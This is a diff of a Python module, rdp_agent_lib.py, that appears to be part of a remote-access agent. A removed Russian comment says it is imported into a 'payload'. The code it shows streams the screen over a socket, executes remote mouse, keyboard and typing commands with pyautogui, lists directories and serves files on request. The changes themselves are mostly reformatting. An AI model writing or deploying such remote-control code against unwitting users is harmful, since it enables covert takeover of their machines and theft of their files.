@@ -1,5 +1,4 @@
 # language: Python, file: rdp_agent_lib.py
-# *RDP-канал как модуль: импортируется в payload и в rdp_agent.py*
 import os, sys, socket, struct, json, io, threading, time, base64
 import pyautogui
 from PIL import ImageGrab
@@ -13,21 +12,16 @@ def _send(sock, obj, lock):
 
 def _recv(sock):
     hdr = sock.recv(4)
-    if not hdr:
-        return None
+    if not hdr: return None
     n = struct.unpack("!I", hdr)[0]
-    if n > 20_000_000:
-        return None
+    if n > 20_000_000: return None
     buf = b""
     while len(buf) < n:
         c = sock.recv(n - len(buf))
-        if not c:
-            return None
+        if not c: return None
         buf += c
-    try:
-        return json.loads(buf)
-    except Exception:
-        return None
+    try: return json.loads(buf)
+    except Exception: return None
 
 def _screen_loop(sock, lock):
     while True:
@@ -44,8 +38,7 @@ def _screen_loop(sock, lock):
 def _input_loop(sock, lock):
     while True:
         msg = _recv(sock)
-        if not msg:
-            break
+        if not msg: break
         t = msg.get("t")
         try:
             if t == "mouse":
@@ -53,14 +46,10 @@ def _input_loop(sock, lock):
                 if msg.get("click"):
                     pyautogui.click(button=msg.get("button", "left"),
                                     clicks=int(msg.get("clicks", 1)), interval=0.05)
-            elif t == "scroll":
-                pyautogui.scroll(msg["dy"])
+            elif t == "scroll": pyautogui.scroll(msg["dy"])
             elif t == "key":
                 k = msg.get("key")
-                if msg.get("down"):
-                    pyautogui.keyDown(k)
-                else:
-                    pyautogui.keyUp(k)
+                (pyautogui.keyDown if msg.get("down") else pyautogui.keyUp)(k)
             elif t == "type":
                 if msg["text"].isascii():
                     pyautogui.write(msg["text"], interval=0.01)
@@ -74,14 +63,11 @@ def _input_loop(sock, lock):
                 try:
                     for n in os.listdir(path):
                         full = os.path.join(path, n)
-                        try:
-                            items.append({"name": n, "dir": os.path.isdir(full),
-                                          "size": os.path.getsize(full)})
-                        except OSError:
-                            continue
+                        try: items.append({"name": n, "dir": os.path.isdir(full),
+                                           "size": os.path.getsize(full)})
+                        except OSError: continue
                 except OSError as e:
-                    _send(sock, {"t": "err", "msg": str(e)}, lock)
-                    continue
+                    _send(sock, {"t": "err", "msg": str(e)}, lock); continue
                 _send(sock, {"t": "list", "path": path, "items": items}, lock)
             elif t == "get":
                 try:
